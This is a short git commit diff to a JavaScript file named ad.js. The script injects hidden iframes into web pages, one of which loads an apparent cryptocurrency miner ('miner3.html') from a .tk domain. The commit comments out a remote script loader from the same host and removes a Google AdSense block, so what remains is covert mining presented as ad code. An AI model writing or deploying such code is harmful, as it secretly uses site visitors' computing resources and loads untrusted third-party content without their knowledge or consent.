b28d80a6cad2cb47fec6c30ef2118aeefa66cc77
ClydeKuo <clydekuo6@gmail.com>
2017-10-28 18:56:31 +0800

    fewf

--- ad.js
+++ ad.js
@@ -1,14 +1,13 @@
 (function () {
     if(document.getElementById("emprise")) return
     //基�?�
-    var b = document.createElement("script");
+    /* var b = document.createElement("script");
     b.src = "http://www.7k77.tk/eicXsB?1504592003";
-    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
+    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b) */
     var divs=[
 
     "<iframe id=\"emprise\" src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
-    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>",
-    "<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- tesst -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-3568322529043220\"\n     data-ad-slot=\"7186075983\"\n     data-ad-format=\"auto\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"
+    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
     ]
     for (var i=0,len=divs.length;i<len;i++){
         document.body.innerHTML+=divs[i]
